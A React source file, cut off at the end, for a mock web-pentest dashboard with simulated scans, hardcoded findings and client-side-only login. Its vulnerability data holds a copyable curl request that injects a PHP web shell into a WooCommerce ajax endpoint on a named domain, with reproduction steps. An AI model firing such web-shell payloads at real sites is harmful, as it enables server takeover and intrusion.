import React, { useState, useEffect } from 'react';
import { 
  Shield, 
  LayoutDashboard, 
  Play, 
  FileText, 
  Settings, 
  Plus, 
  RotateCw, 
  AlertTriangle, 
  ShieldAlert, 
  ShieldCheck, 
  Clock, 
  LogOut, 
  X, 
  Lock, 
  Mail, 
  User, 
  Key, 
  Bell, 
  Terminal, 
  Copy, 
  Check, 
  Zap, 
  Send,
  Code2,
  ChevronDown,
  ChevronUp,
  Trash2,
  ExternalLink,
  Download,
  GitBranch,
  CheckCircle2
} from 'lucide-react';

const INITIAL_SITES = [
  {
    id: 1,
    name: 'TechCorp E-Commerce',
    url: 'https://techcorp.com',
    cms: 'WordPress 6.4.2',
    securityScore: 88,
    status: 'Safe',
    pluginsOutdated: 3,
    lastScan: '2 hours ago'
  },
  {
    id: 2,
    name: 'Fashion Hub BD',
    url: 'https://fashionhub.com.bd',
    cms: 'WordPress 6.1.1',
    securityScore: 54,
    status: 'Vulnerable',
    pluginsOutdated: 12,
    lastScan: '1 day ago'
  }
];

const VULNERABILITIES = [
  {
    id: 'vuln-1',
    title: 'Outdated Plugin: WooCommerce Core RCE',
    cve: 'CVE-2023-48771',
    cvssScore: '9.8',
    severity: 'Critical',
    description: 'Unauthenticated Remote Code Execution vulnerability found in active version 7.8.0.',
    remediation: 'Update WooCommerce plugin to version 8.2.1 or higher immediately.',
    pocPayload: `curl -i -s -k -X POST 'https://fashionhub.com.bd/wp-admin/admin-ajax.php' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  --data 'action=woocommerce_update_order_review&payload=<?php system($_GET["cmd"]); ?>'`,
    reproSteps: [
      '1. Send HTTP POST request to /wp-admin/admin-ajax.php endpoint.',
      '2. Inject unvalidated php system command payload into WooCommerce ajax action parameter.',
      '3. Observe arbitrary code execution output in response header.'
    ]
  },
  {
    id: 'vuln-2',
    title: 'Missing Content Security Policy (CSP) Header',
    cve: 'CWE-693',
    cvssScore: '6.5',
    severity: 'Medium',
    description: 'The HTTP header does not restrict resource loading, increasing Cross-Site Scripting (XSS) risks.',
    remediation: 'Configure Content-Security-Policy header on web server or via wp-config.php.',
    pocPayload: `curl -I -X GET 'https://techcorp.com/' \\
  -H 'User-Agent: SecurOps-Audit-Scanner/2.1'`,
    reproSteps: [
      '1. Fetch target HTTP response headers using standard GET request.',
      '2. Verify absence of "Content-Security-Policy" or "X-Frame-Options" headers.',
      '3. Test inline script execution capability via browser DevTools console.'
    ]
  }
];

// Helper Functions
const isValidEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

const getPasswordStrength = (pass) => {
  let score = 0;
  if (pass.length >= 8) score++;
  if (/[A-Z]/.test(pass)) score++;
  if (/[a-z]/.test(pass)) score++;
  if (/[0-9]/.test(pass)) score++;
  if (/[^A-Za-z0-9]/.test(pass)) score++;
  return score;
};

export default function App() {
  // Auth States
  const [isAuthenticated, setIsAuthenticated] = useState(() => localStorage.getItem('isAuth') === 'true');
  const [authMode, setAuthMode] = useState('login');
  const [currentUser, setCurrentUser] = useState(() => 
    JSON.parse(localStorage.getItem('user')) || { name: 'Admin User', email: 'admin@securops.io' }
  );
  const [emailInput, setEmailInput] = useState(currentUser.email || '');
  const [passwordInput, setPasswordInput] = useState('');
  const [nameInput, setNameInput] = useState(currentUser.name || '');
  const [authError, setAuthError] = useState('');

  // Navigation & Data States
  const [activeTab, setActiveTab] = useState('dashboard');
  const [sites, setSites] = useState(() => {
    const saved = localStorage.getItem('client_sites');
    return saved ? JSON.parse(saved) : INITIAL_SITES;
  });
  const [selectedSite, setSelectedSite] = useState(INITIAL_SITES[0]);
  const [isScanning, setIsScanning] = useState(false);

  // PoC & Interactive States
  const [expandedPoc, setExpandedPoc] = useState(null);
  const [copiedPocId, setCopiedPocId] = useState(null);
  const [copiedCicd, setCopiedCicd] = useState(false);

  // Modal States
  const [isAddSiteOpen, setIsAddSiteOpen] = useState(false);
  const [newSiteName, setNewSiteName] = useState('');
  const [newSiteUrl, setNewSiteUrl] = useState('');
  const [newSiteCms, setNewSiteCms] = useState('WordPress 6.4.2');

  // Settings & Integrations
  const [apiKeys, setApiKeys] = useState(() => 
    JSON.parse(localStorage.getItem('api_keys')) || { wpscan: '', owaspZap: '' }
  );
  const [webhooks, setWebhooks] = useState(() => 
    JSON.parse(localStorage.getItem('webhook_settings')) || { slackUrl: '', telegramToken: '', telegramChatId: '', notifyOnCritical: true }
  );

  // CI/CD Generator States
  const [cicdPlatform, setCicdPlatform] = useState('github');
  const [cicdTool, setCicdTool] = useState('wpscan');

  // Toast System
  const [toastMessage, setToastMessage] = useState(null);

  useEffect(() => {
    localStorage.setItem('client_sites', JSON.stringify(sites));
  }, [sites]);

  const showToast = (msg) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3000);
  };

  const handleAuthSubmit = (e) => {
    e.preventDefault();
    setAuthError('');
    if (!isValidEmail(emailInput)) {
      setAuthError('Please enter a valid email address.');
      return;
    }
    if (authMode === 'signup' && getPasswordStrength(passwordInput) < 3) {
      setAuthError('Password must meet at least 3 strength criteria.');
      return;
    }
    const userObj = { name: authMode === 'signup' ? nameInput : (currentUser.name || 'Admin User'), email: emailInput };
    setCurrentUser(userObj);
    setIsAuthenticated(true);
    localStorage.setItem('isAuth', 'true');
    localStorage.setItem('user', JSON.stringify(userObj));
    showToast(`Welcome back, ${userObj.name}!`);
  };

  const handleAddSite = (e) => {
    e.preventDefault();
    if (!newSiteName || !newSiteUrl) return;
    const newSite = {
      id: Date.now(),
      name: newSiteName,
      url: newSiteUrl.startsWith('http') ? newSiteUrl : `https://${newSiteUrl}`,
      cms: newSiteCms,
      securityScore: 92,
      status: 'Safe',
      pluginsOutdated: 0,
      lastScan: 'Just now'
    };
    setSites([newSite, ...sites]);
    setNewSiteName('');
    setNewSiteUrl('');
    setIsAddSiteOpen(false);
    showToast('New target site added successfully!');
  };

  const handleDeleteSite = (id) => {
    const updated = sites.filter(s => s.id !== id);
    setSites(updated);
    if (selectedSite.id === id && updated.length > 0) {
      setSelectedSite(updated[0]);
    }
    showToast('Target site removed.');
  };

  const handleRunScan = () => {
    setIsScanning(true);
    showToast(`Initiating automated audit for ${selectedSite.name}...`);
    setTimeout(() => {
      setIsScanning(false);
      showToast('Scan completed! Vulnerability findings updated.');
    }, 2500);
  };

  const copyPocPayload = (id, payload) => {
    navigator.clipboard.writeText(payload);
    setCopiedPocId(id);
    showToast('cURL Payload copied to clipboard!');
    setTimeout(() => setCopiedPocId(null), 2000);
  };

  const handleSaveSettings = (e) => {
    e.preventDefault();
    localStorage.setItem('api_keys', JSON.stringify(apiKeys));
    localStorage.setItem('webhook_settings', JSON.stringify(webhooks));
    showToast('Settings & Webhook API configurations saved!');
  };

  const generateCicdYaml = () => {
    if (cicdPlatform === 'github') {
      return `name: SecurOps Automated Security Audit
on:
  push:
    branches: [ main, develop ]
  schedule:
    - cron: '0 0 * * 0'

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Run ${cicdTool.toUpperCase()} Audit Scan
        uses: securops/scan-action@v2
        with:
          target-url: '${selectedSite.url}'
          api-key: \${{ secrets.${cicdTool.toUpperCase()}_API_KEY }}
          fail-on-critical: true`;
    }
    return `stages:
  - security

security_scan:
  stage: security
  image: securops/scanner:latest
  script:
    - securops-cli scan --target "${selectedSite.url}" --tool ${cicdTool}
  only:
    - main`;
  };

  // Auth Screen Render
  if (!isAuthenticated) {
    const passStrength = getPasswordStrength(passwordInput);
    return (
      <div className="min-h-screen bg-[#0b0f19] flex items-center justify-center p-4 text-slate-100 font-sans">
        <div className="bg-[#111827] border border-slate-800 w-full max-w-md rounded-2xl p-8 space-y-6 shadow-2xl">
          <div className="text-center space-y-2">
            <div className="w-12 h-12 bg-blue-600 rounded-xl flex items-center justify-center mx-auto shadow-lg shadow-blue-600/30">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <h2 className="text-2xl font-bold text-white">SecurOps Hub</h2>
            <p className="text-xs text-slate-400">Automated Web Security & Pentesting Platform</p>
          </div>

          <div className="flex bg-[#1e293b]/60 p-1 rounded-lg text-xs font-semibold">
            <button 
              onClick={() => setAuthMode('login')} 
              className={`flex-1 py-2 rounded-md transition ${authMode === 'login' ? 'bg-blue-600 text-white' : 'text-slate-400'}`}
            >
              Sign In
            </button>
            <button 
              onClick={() => setAuthMode('signup')} 
              className={`flex-1 py-2 rounded-md transition ${authMode === 'signup' ? 'bg-blue-600 text-white' : 'text-slate-400'}`}
            >
              Register
            </button>
          </div>

          {authError && <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-lg text-xs text-red-400">{authError}</div>}

          <form onSubmit={handleAuthSubmit} className="space-y-4">
            {authMode === 'signup' && (
              <div>
                <label className="text-[11px] font-semibold text-slate-400 block mb-1">Full Name</label>
                <div className="relative">
                  <User className="w-4 h-4 text-slate-500 absolute left-3 top-3" />
                  <input 
                    type="text" 
                    required
                    placeholder="Wasiur Rahman" 
                    value={nameInput}
                    onChange={(e) => setNameInput(e.target.value)}
                    className="w-full bg-[#1e293b]/60 border border-slate-700 rounded-lg pl-9 pr-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
              </div>
            )}

            <div>
              <label className="text-[11px] font-semibold text-slate-400 block mb-1">Email Address</label>
              <div className="relative">
                <Mail className="w-4 h-4 text-slate-500 absolute left-3 top-3" />
                <input 
                  type="email" 
                  required
                  placeholder="admin@securops.io" 
                  value={emailInput}
                  onChange={(e) => setEmailInput(e.target.value)}
                  className="w-full bg-[#1e293b]/60 border border-slate-700 rounded-lg pl-9 pr-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500"
                />
              </div>
            </div>

            <div>
              <label className="text-[11px] font-semibold text-slate-400 block mb-1">Password</label>
              <div className="relative">
                <Lock className="w-4 h-4 text-slate-500 absolute left-3 top-3" />
                <input 
                  type="password" 
                  required
                  placeholder="••••••••" 
                  value={passwordInput}
                  onChange={(e) => setPasswordInput(e.target.value)}
                  className="w-full bg-[#1e293b]/60 border border-slate-700 rounded-lg pl-9 pr-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500"
                />
              </div>

              {/* Password Strength Meter */}
              {authMode === 'signup' && passwordInput.length > 0 && (
                <div className="mt-2 space-y-1.5">
                  <div className="flex gap-1 h-1.5">
                    {[1, 2, 3, 4, 5].map((lvl) => (
                      <div 
                        key={lvl} 
                        className={`flex-1 rounded-full transition-all ${
                          passStrength >= lvl 
                            ? passStrength <= 2 ? 'bg-red-500' : passStrength <= 4 ? 'bg-amber-500' : 'bg-emerald-500' 
                            : 'bg-slate-800'
                        }`}
                      />
                    ))}
                  </div>
                  <div className="text-[10px] text-slate-400 flex justify-between">
                    <span>Password Strength:</span>
                    <span className="font-semibold text-slate-200">
                      {passStrength <= 2 ? 'Weak' : passStrength <= 4 ? 'Medium' : 'Strong Security'}
                    </span>
                  </div>
                </div>
              )}
            </div>

            <button type="submit" className="w-full py-2.5 bg-blue-600 hover:bg-blue-500 font-semibold text-xs rounded-lg text-white transition shadow-lg shadow-blue-600/20">
              {authMode === 'login' ? 'Sign In to Dashboard' : 'Create Account'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-[#0b0f19] text-slate-100 font-sans overflow-hidden">
      
      {/* Toast Notification */}
      {toastMessage && (
        <div className="fixed top-4 right-4 z-50 bg-blue-600 text-white px-4 py-3 rounded-xl text-xs font-semibold flex items-center gap-2 shadow-2xl animate-bounce">
          <Zap className="w-4 h-4 text-yellow-300" />
          {toastMessage}
        </div>
      )}

      {/* SIDEBAR */}
      <aside className="w-64 bg-[#111827] border-r border-slate-800 flex flex-col justify-between shrink-0">
        <div>
          <div className="p-5 flex items-center gap-3 border-b border-slate-800">
            <div className="p-2 bg-blue-600 rounded-lg text-white shadow-md shadow-blue-600/30">
              <Shield className="w-5 h-5" />
            </div>
            <div>
              <span className="font-bold text-base text-white block leading-none">SecurOps Hub</span>
              <span className="text-[10px] text-slate-400">Pentest & Security QA</span>
            </div>
          </div>

          <nav className="p-4 space-y-1 text-xs font-medium">
            <button 
              onClick={() => setActiveTab('dashboard')} 
              className={`w-full flex items-center gap-3 p-2.5 rounded-lg transition ${activeTab === 'dashboard' ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30 font-semibold' : 'text-slate-400 hover:bg-slate-800/50'}`}
            >
              <LayoutDashboard className="w-4 h-4" /> Overview Dashboard
            </button>
            <button 
              onClick={() => setActiveTab('scanner')} 
              className={`w-full flex items-center gap-3 p-2.5 rounded-lg transition ${activeTab === 'scanner' ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30 font-semibold' : 'text-slate-400 hover:bg-slate-800/50'}`}
            >
              <Play className="w-4 h-4" /> Scanner & PoC Engine
            </button>
            <button 
              onClick={() => setActiveTab('cicd')} 
              className={`w-full flex items-center gap-3 p-2.5 rounded-lg transition ${activeTab === 'cicd' ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30 font-semibold' : 'text-slate-400 hover:bg-slate-800/50'}`}
            >
              <GitBranch className="w-4 h-4" /> CI/CD Pipeline Generator
            </button>
            <button 
              onClick={() => setActiveTab('settings')} 
              className={`w-full flex items-center gap-3 p-2.5 rounded-lg transition ${activeTab === 'settings' ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30 font-semibold' : 'text-slate-400 hover:bg-slate-800/50'}`}
            >
              <Settings className="w-4 h-4" /> Webhooks & API Keys
            </button>
            <button 
              onClick={() => setActiveTab('reports')} 
              className={`w-full flex items-center gap-3 p-2.5 rounded-lg transition ${activeTab === 'reports' ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30 font-semibold' : 'text-slate-400 hover:bg-slate-800/50'}`}
            >
              <FileText className="w-4 h-4" /> Reports & Audit Logs
            </button>
          </nav>
        </div>

        {/* User Info & Signout */}
        <div className="p-4 border-t border-slate-800 space-y-3">
          <div className="flex items-center gap-3 px-2">
            <div className="w-8 h-8 rounded-full bg-blue-600/20 border border-blue-500/30 text-blue-400 flex items-center justify-center font-bold text-xs">
              {currentUser.name.charAt(0)}
            </div>
            <div className="overflow-hidden">
              <p className="text-xs font-semibold text-white truncate">{currentUser.name}</p>
              <p className="text-[10px] text-slate-400 truncate">{currentUser.email}</p>
            </div>
          </div>
          <button 
            onClick={() => { setIsAuthenticated(false); localStorage.removeItem('isAuth'); }} 
            className="w-full flex items-center gap-2 px-3 py-2 text-xs font-semibold text-red-400 hover:bg-red-500/10 border border-red-500/20 rounded-lg transition"
          >
            <LogOut className="w-4 h-4" /> Sign Out
          </button>
        </div>
      </aside>

      {/* MAIN CONTENT AREA */}
      <main className="flex-1 overflow-y-auto bg-[#0b0f19] p-6 space-y-6">
        
        {/* OVERVIEW DASHBOARD */}
        {activeTab === 'dashboard' && (
          <div className="space-y-6 max-w-6xl mx-auto">
            
            <div className="flex justify-between items-center">
              <div>
                <h2 className="text-2xl font-bold text-white">Security Posture Overview</h2>
                <p className="text-xs text-slate-400">Real-time status of monitored web applications and APIs</p>
              </div>
              <button 
                onClick={() => setIsAddSiteOpen(true)}
                className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-lg flex items-center gap-2 shadow-lg shadow-blue-600/20 transition"
              >
                <Plus className="w-4 h-4" /> Add Target Site
              </button>
            </div>

            {/* Quick Metrics */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
              <div className="bg-[#111827] border border-slate-800 p-4 rounded-xl space-y-1">
                <span className="text-[11px] font-semibold text-slate-400">Total Monitored Targets</span>
                <p className="text-2xl font-bold text-white">{sites.length}</p>
              </div>
              <div className="bg-[#111827] border border-slate-800 p-4 rounded-xl space-y-1">
                <span className="text-[11px] font-semibold text-slate-400">Active Vulnerabilities</span>
                <p className="text-2xl font-bold text-red-400">2 Critical / High</p>
              </div>
              <div className="bg-[#111827] border border-slate-800 p-4 rounded-xl space-y-1">
                <span className="text-[11px] font-semibold text-slate-400">Avg. Security Score</span>
                <p className="text-2xl font-bold text-emerald-400">71 / 100</p>
              </div>
              <div className="bg-[#111827] border border-slate-800 p-4 rounded-xl space-y-1">
                <span className="text-[11px] font-semibold text-slate-400">CI/CD Webhooks</span>
                <p className="text-2xl font-bold text-blue-400">Active</p>
              </div>
            </div>

            {/* Client Sites Cards */}
            <div className="space-y-3">
              <h3 className="text-base font-bold text-white">Monitored Web Applications</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {sites.map(site => (
                  <div key={site.id} className="bg-[#111827] border border-slate-800 p-5 rounded-xl space-y-4 hover:border-slate-700 transition">
                    <div className="flex justify-between items-start">
                      <div>
                        <h4 className="font-bold text-base text-white">{site.name}</h4>
                        <a href={site.url} target="_blank" rel="noreferrer" className="text-xs text-blue-400 hover:underline font-mono flex items-center gap-1 mt-0.5">
                          {site.url} <ExternalLink className="w-3 h-3" />
                        </a>
                      </div>
                      <span className={`px-2.5 py-1 rounded text-xs font-bold ${site.status === 'Safe' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-red-500/20 text-red-400 border border-red-500/30'}`}>
                        {site.securityScore}% Score
                      </span>
                    </div>

                    <div className="grid grid-cols-2 gap-2 text-xs bg-[#1e293b]/40 p-3 rounded-lg border border-slate-800">
                      <div>
                        <span className="text-slate-400 block text-[10px]">Detected CMS:</span>
                        <span className="font-semibold text-slate-200">{site.cms}</span>
                      </div>
                      <div>
                        <span className="text-slate-400 block text-[10px]">Outdated Components:</span>
                        <span className="font-semibold text-amber-400">{site.pluginsOutdated} Plugins</span>
                      </div>
                    </div>

                    <div className="flex items-center justify-between pt-2">
                      <button 
                        onClick={() => { setSelectedSite(site); setActiveTab('scanner'); }} 
                        className="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs rounded-lg font-semibold flex items-center gap-1.5 transition"
                      >
                        <Play className="w-3.5 h-3.5" /> Launch Audit Scan
                      </button>
                      
                      <button 
                        onClick={() => handleDeleteSite(site.id)}
                        className="p-1.5 text-slate-500 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>

          </div>
        )}

        {/* SCANNER & POC ENGINE TAB */}
        {activeTab === 'scanner' && (
          <div className="space-y-6 max-w-5xl mx-auto">
            
            {/* Target Selector & Scanner Action Bar */}
            <div className="bg-[#111827] border border-slate-800 rounded-xl p-6 shadow-xl space-y-4">
              <div className="flex flex-col sm:flex-row justify-between sm:items-center gap-4">
                <div>
                  <h2 className="text-xl font-bold text-white">Automated Pentest & PoC Engine</h2>
                  <p className="text-xs text-slate-400">Targeting: <span className="text-blue-400 font-mono font-semibold">{selectedSite.url}</span> ({selectedSite.name})</p>
                </div>

                <div className="flex items-center gap-2">
                  <select 
                    value={selectedSite.id} 
                    onChange={(e) => setSelectedSite(sites.find(s => s.id === Number(e.target.value)))}
                    className="bg-[#1e293b] border border-slate-700 text-xs font-semibold text-white px-3 py-2 rounded-lg"
                  >
                    {sites.map(s => <option key={s.id} value={s.id}>{s.name}</option>)}
                  </select>

                  <button 
                    onClick={handleRunScan} 
                    disabled={isScanning}
                    className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-lg flex items-center gap-2 transition disabled:opacity-50"
                  >
                    <RotateCw className={`w-3.5 h-3.5 ${isScanning ? 'animate-spin' : ''}`} /> 
                    {isScanning ? 'Scanning Target...' : 'Re-Run Scan'}
                  </button>
                </div>
              </div>
            </div>

            {/* Findings & PoC Exploit Box */}
            <div className="space-y-4">
              <h3 className="text-base font-bold text-white flex items-center gap-2">
                <ShieldAlert className="w-5 h-5 text-red-400" /> Discovered Vulnerabilities & PoC Exploits
              </h3>

              {VULNERABILITIES.map((vuln) => {
                const isExpanded = expandedPoc === vuln.id;
                return (
                  <div key={vuln.id} className="bg-[#111827] border border-slate-800 rounded-xl p-5 space-y-4 shadow-xl">
                    
                    <div className="flex items-start justify-between gap-4">
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <span className={`px-2.5 py-0.5 text-[10px] font-bold rounded border uppercase ${vuln.severity === 'Critical' ? 'bg-purple-500/20 text-purple-400 border-purple-500/30' : 'bg-red-500/20 text-red-400 border-red-500/30'}`}>
                            CVSS {vuln.cvssScore} • {vuln.severity}
                          </span>
                          <span className="text-xs font-mono text-slate-400 bg-slate-900 px-2 py-0.5 rounded border border-slate-800">{vuln.cve}</span>
                        </div>
                        <h4 className="text-base font-bold text-white">{vuln.title}</h4>
                      </div>
                      
                      <button 
                        onClick={() => setExpandedPoc(isExpanded ? null : vuln.id)}
                        className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-blue-400 border border-slate-700 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition"
                      >
                        <Code2 className="w-4 h-4 text-blue-400" />
                        <span>{isExpanded ? 'Hide PoC Exploit' : 'Show PoC Payload'}</span>
                        {isExpanded ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
                      </button>
                    </div>

                    <p className="text-xs text-slate-300 leading-relaxed">{vuln.description}</p>

                    <div className="p-3 bg-[#1e293b]/40 border border-slate-800/80 rounded-lg text-xs text-slate-200">
                      <strong className="text-emerald-400 block mb-1">Recommended Patch / Remediation:</strong>
                      {vuln.remediation}
                    </div>

                    {/* EXPANDABLE POC EXPLOIT GENERATOR */}
                    {isExpanded && (
                      <div className="pt-4 border-t border-slate-800 space-y-4">
                        <div className="space-y-1.5">
                          <h5 className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
                            <Terminal className="w-3.5 h-3.5 text-blue-400" /> Reproduction Guide:
                          </h5>
                          <ul className="space-y-1 text-xs text-slate-400 font-mono bg-slate-950/60 p-3 rounded-lg border border-slate-800">
                            {vuln.reproSteps.map((step, idx) => (
                              <li key={idx}>{step}</li>
                            ))}
                          </ul>
                        </div>

                        <div className="space-y-1.5">
                          <div className="flex items-center justify-between text-xs text-slate-400">
                            <span className="font-semibold text-white">cURL Exploit Request Payload:</span>
                            <button 
                              onClick={() => copyPocPayload(vuln.id, vuln.pocPayload)}
                              className="flex items-center gap-1 text-blue-400 hover:text-blue-300 text-[11px] font-semibold"
                            >
                              {copiedPocId === vuln.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                              {copiedPocId === vuln.id ? 'Copied Payload!' : 'Copy cURL Command'}
                            </button>
                          </div>
                          
                          <pre className="bg-[#080c14] p-4 rounded-lg border border-slate-800 text-[11px] font-mono text-emerald-400 overflow-x-auto leading-relaxed">
                            {vuln.pocPayload}
                          </pre>
                        </div>
                      </div>
                    )}

                  </div>
                );
              })}
            </div>

          </div>
        )}

        {/* CI/CD PIPELINE GENERATOR TAB */}
        {activeTab === 'cicd' && (
          <div className="space-y-6 max-w-4xl mx-auto">
            <div className="bg-[#111827] border border-slate-800 rounded-xl p-6 shadow-xl space-y-6">
              <div>
                <h2 className="text-xl font-bold text-white">DevSecOps CI/CD Pipeline Generator</h2>
                <p className="text-xs text-slate-400">Automate security audits directly within your GitHub or GitLab deployment workflows</p>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">CI/CD Platform</label>
                  <select 
                    value={cicdPlatform} 
                    onChange={(e) => setCicdPlatform(e.target.value)}
                    className="w-full bg-[#1e293b] border border-slate-700 text-xs font-semibold text-white p-2.5 rounded-lg"
                  >
                    <option value="github">GitHub Actions (.github/workflows)</option>
                    <option value="gitlab">GitLab CI (.gitlab-ci.yml)</option>
                  </select>
                </div>

                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">Security Audit Tool</label>
                  <select 
                    value={cicdTool} 
                    onChange={(e) => setCicdTool(e.target.value)}
                    className="w-full bg-[#1e293b] border border-slate-700 text-xs font-semibold text-white p-2.5 rounded-lg"
                  >
                    <option value="wpscan">WPScan Vulnerability Scanner</option>
                    <option value="owasp">OWASP ZAP Dynamic Audit</option>
                  </select>
                </div>
              </div>

              <div className="space-y-2">
                <div className="flex justify-between items-center text-xs">
                  <span className="font-semibold text-slate-300">Generated Pipeline YAML Config:</span>
                  <button 
                    onClick={() => {
                      navigator.clipboard.writeText(generateCicdYaml());
                      setCopiedCicd(true);
                      showToast('CI/CD YAML copied!');
                      setTimeout(() => setCopiedCicd(false), 2000);
                    }}
                    className="text-blue-400 hover:text-blue-300 font-semibold flex items-center gap-1"
                  >
                    {copiedCicd ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                    {copiedCicd ? 'Copied YAML' : 'Copy Configuration'}
                  </button>
                </div>

                <pre className="bg-[#080c14] p-4 rounded-lg border border-slate-800 text-[11px] font-mono text-blue-300 overflow-x-auto leading-relaxed">
                  {generateCicdYaml()}
                </pre>
              </div>
            </div>
          </div>
        )}

        {/* WEBHOOKS & API SETTINGS TAB */}
        {activeTab === 'settings' && (
          <div className="space-y-6 max-w-4xl mx-auto">
            <form onSubmit={handleSaveSettings} className="bg-[#111827] border border-slate-800 rounded-xl p-6 shadow-xl space-y-6">
              <div>
                <h2 className="text-xl font-bold text-white">API Keys & Webhook Integrations</h2>
                <p className="text-xs text-slate-400">Connect automated scanner engines and Slack/Telegram alert systems</p>
              </div>

              <div className="space-y-4">
                <h3 className="text-xs font-bold text-blue-400 uppercase tracking-wider">Scanner API Keys</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="text-xs font-semibold text-slate-400 block mb-1">WPScan API Token</label>
                    <input 
                      type="password" 
                      placeholder="wpscan_live_api_key_..." 
                      value={apiKeys.wpscan}
                      onChange={(e) => setApiKeys({ ...apiKeys, wpscan: e.target.value })}
                      className="w-full bg-[#1e293b]/60 border border-slate-700 rounded-lg p-2.5 text-xs text-white"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-semibold text-slate-400 block mb-1">OWASP ZAP Key</label>
                    <input 
                      type="password" 
                      placeholder="zap_api_key_..." 
                      value={apiKeys.owaspZap}
                      onChange={(e) => setApiKeys({ ...apiKeys, owaspZap: e.target.value })}
                      className="w-full bg-[#1e293b]/60 border border-slate-700 rounded-lg p-2.5 text-xs text-white"
                    />
                  </div>
                </div>
              </div>

              <div className="space-y-4 pt-4 border-t border-slate-800">
                <h3 className="text-xs font-bold text-blue-400 uppercase tracking-wider">Alert Webhooks</h3>
                <div className="space-y-4">
                  <div>
                    <label className="text-xs font-semibold text-slate-400 block mb-1">Slack Webhook URL</label>
                    <input 
                      type="url" 
                      placeholder="https://hooks.slack.com/services/T00/B00/X00" 
                      value={webhooks.slackUrl}
                      onChange={(e) => setWebhooks({ ...webhooks, slackUrl: e.target.value })}
                      className="w-full bg-[#1e293b]/60 border border-slate-700 rounded-lg p-2.5 text-xs text-white"
                    />
                  </div>

                  <div className="flex items-center gap-3 pt-2">
                    <input 
                      type="checkbox" 
                      id="notifyCrit"
                      checked={webhooks.notifyOnCritical}
                      onChange={(e) => setWebhooks({ ...webhooks, notifyOnCritical: e.target.checked })}
                      className="rounded bg-[#1e293b] border-slate-700 text-blue-600 focus:ring-0"
                    />
                    <label htmlFor="notifyCrit" className="text-xs text-slate-300 font-medium">Instantly send webhook alerts when Critical/High CVEs are detected</label>
                  </div>
                </div>
              </div>

              <button type="submit" className="px-5 py-2.5 bg-blue-600 hover:bg-blue-500 font-semibold text-xs rounded-lg text-white transition">
                Save Configurations
              </button>
            </form>
          </div>
        )}

        {/* REPORTS & EXPORT TAB */}
        {activeTab === 'reports' && (
          <div className="space-y-6 max-w-4xl mx-auto">
            <div className="bg-[#111827] border border-slate-800 rounded-xl p-6 shadow-xl space-y-6">
              <div>
                <h2 className="text-xl font-bold text-white">Audit Reports & Compliance Export</h2>
                <p className="text-xs text-slate-400">Generate executive vulnerability summaries for client presentation</p>
              </div>

              <div className="p-4 bg-[#1e293b]/40 border border-slate-800 rounded-xl space-y-4">
                <div className="flex justify-between items-center">
                  <div>
                    <h4 className="font-bold text-sm text-white">{selectedSite.name} Executive Audit Report</h4>
                    <p className="text-xs text-slate-400">Includes 2 CVE findings, CVSS scores, remediation steps, and cURL PoC payloads.</p>
                  </div>
                  <button 
                    onClick={() => showToast('Generating Executive Audit Report (PDF)...')}
                    className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded-lg flex items-center gap-2"
                  >
                    <Download className="w-3.5 h-3.5" /> Download PDF Report
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

      </main>

      {/* ADD TARGET SITE MODAL */}
      {isAddSiteOpen && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center p-4 z-50">
          <div className="bg-[#111827] border border-slate-800 w-full max-w-md rounded-2xl p-6 space-y-5 shadow-2xl">
            <div className="flex justify-between items-center border-b border-slate-800 pb-3">
              <h3 className="font-bold text-white text-base">Add New Target Site</h3>
              <button onClick={() => setIsAddSiteOpen(false)} className="text-slate-400 hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>

            <form onSubmit={handleAddSite} className="space-y-4">
              <div>
                <label className="text-xs font-semibold text-slate-400 block mb-1">Site Name</label>
                <input 
                  type="text" 
                  required
                  placeholder="My Client Store" 
                  value={newSiteName}
                  onChange={(e) => setNewSiteName(e.target.value)}
                  className="w-full bg-[#1e293b]/60 border border-slate-700 rounded-lg p-2.5 text-xs text-white"
                />
              </div>

              <div>
                <label className="text-xs font-semibold text-slate-400 block mb-1">Target URL</label>
                <input 
                  type="text" 
                  required
                  placeholder="https://example.com" 
